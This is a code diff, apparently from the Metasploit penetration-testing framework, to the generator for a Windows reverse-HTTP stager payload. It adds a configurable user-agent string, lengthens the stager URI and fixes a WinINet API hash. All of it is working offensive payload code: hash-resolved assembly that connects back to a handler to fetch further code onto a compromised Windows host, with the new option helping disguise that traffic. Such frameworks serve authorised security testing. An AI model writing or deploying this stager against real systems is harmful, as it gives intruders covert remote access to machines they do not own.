@@ -128,7 +128,7 @@ module Payload::Windows::ReverseHttp
   # Generate the URI for the initial stager
   #
   def generate_small_uri
-    generate_uri_uuid_mode(:init_native, 5)
+    generate_uri_uuid_mode(:init_native, 30)
   end
 
   #
@@ -255,32 +255,43 @@ module Payload::Windows::ReverseHttp
         xor ebx, ebx           ; Set ebx to NULL to use in future arguments
     ^
 
+    asm << %Q^
+    internetopen:
+      push ebx               ; DWORD dwFlags
+    ^
     if proxy_enabled
       asm << %Q^
-      internetopen:
-        push ebx               ; DWORD dwFlags
         push esp               ; LPCTSTR lpszProxyBypass ("" = empty string)
       call get_proxy_server
         db "#{proxy_info}", 0x00
       get_proxy_server:
                                ; LPCTSTR lpszProxyName (via call)
         push 3                 ; DWORD dwAccessType (INTERNET_OPEN_TYPE_PROXY = 3)
-        push ebx               ; LPCTSTR lpszAgent (NULL)
-        push #{Rex::Text.block_api_hash('wininet.dll', 'InternetOpenA')}
-        call ebp
       ^
     else
       asm << %Q^
-      internetopen:
-        push ebx               ; DWORD dwFlags
         push ebx               ; LPCTSTR lpszProxyBypass (NULL)
         push ebx               ; LPCTSTR lpszProxyName (NULL)
         push ebx               ; DWORD dwAccessType (PRECONFIG = 0)
-        push ebx               ; LPCTSTR lpszAgent (NULL)
-        push #{Rex::Text.block_api_hash('wininet.dll', 'InternetOpenA')}
-        call ebp
       ^
     end
+    if opts[:ua].nil?
+      asm << %Q^
+        push ebx               ; LPCTSTR lpszAgent (NULL)
+      ^
+    else
+      asm << %Q^
+        push ebx               ; LPCTSTR lpszProxyBypass (NULL)
+      call get_useragent
+        db "#{opts[:ua]}", 0x00
+                               ; LPCTSTR lpszAgent (via call)
+      get_useragent:
+      ^
+    end
+    asm << %Q^
+      push #{Rex::Text.block_api_hash('wininet.dll', 'InternetOpenA')}
+      call ebp
+    ^
 
     asm << %Q^
       internetconnect:
@@ -330,7 +341,7 @@ module Payload::Windows::ReverseHttp
                              ; LPVOID lpBuffer (password from previous call)
         push 44              ; DWORD dwOption (INTERNET_OPTION_PROXY_PASSWORD)
         push esi             ; hConnection
-        push #{Rex::Text.block_api_hash('wininet.dll', 'HttpAddRequestHeaders')}
+        push #{Rex::Text.block_api_hash('wininet.dll', 'InternetSetOptionA')}
         call ebp
       ^
     end
